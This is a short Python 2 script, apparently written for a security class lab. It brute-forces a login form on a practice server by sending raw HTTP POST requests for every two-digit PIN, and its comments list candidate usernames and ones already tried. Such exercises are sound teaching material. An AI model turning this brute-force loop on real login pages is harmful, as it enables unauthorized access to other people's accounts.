# bruteForce3.py
# LU: 08/15/15

# bruteForcing login screen. 
# Nota Bene that you can have up to 100 connections on Apache servers
# before you have try a new port number.
#
# Trying to crack username and pass for http://prairiehome.publicradio.org/features/hodgepodge/19980911_season24/


# Possible usernames: Sarah Bellum, Pete Moss, Sandy Beach, (admin)?
# Possible PIN: 00, 01, 02, ... , 98, 99

# Known failures: s.bellum, S.Bellum, S.bellum, s.Bellum, Sarah.Bellum, 
# sarah.bellum, Sarah.b, sarah.b, bellum.s, Bellum.S, 

import socket, sys
socket.setdefaulttimeout(2)

s = socket.socket()

target = "attack.samsclass.info"
tport = 80

s.connect((target, tport))

user = sys.argv[1]
print "\nUsername: " + user

# Try all 100 pins and see if any results work.
for pin in range(00, 100):
	if pin < 10:
		pw = "0" + str(pin)
	else:
		pw = pin

	length = len(user) + len(str(pw)) + 5

	print "\nTrying pw as " + str(pw)
	print "\n"

	s.send("POST /python/login3.php HTTP/1.1\nHost: " + target \
		+ "\nContent-Length: " + str(length) \
		+ "\nContent-Type: application/x-www-form-urlencoded" \
		+ "\n\nu=" + user + "&p=" + str(pw))
	print s.recv(1024)

s.close()
